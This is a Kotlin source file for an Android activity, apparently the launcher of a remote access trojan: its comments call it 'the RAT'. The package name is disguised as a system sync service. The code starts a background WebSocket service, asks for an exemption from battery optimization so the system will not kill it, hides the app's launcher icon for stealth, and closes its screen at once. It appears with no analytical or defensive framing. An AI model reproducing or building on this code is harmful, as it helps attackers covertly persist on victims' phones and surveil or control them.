package com.system.services.sync

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings

class SystemActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Start the background WebSocket service
        val serviceIntent = Intent(this, SyncService::class.java)
        startForegroundService(serviceIntent)

        // 2. Request to ignore battery optimizations (Prevents Android from killing the RAT)
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent()
                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // 3. Hide the app icon from the app drawer (Stealth)
        try {
            val p = packageManager
            val componentName = ComponentName(this, SystemActivity::class.java)
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // 4. Finish the activity so the screen closes immediately
        finish()
    }
}
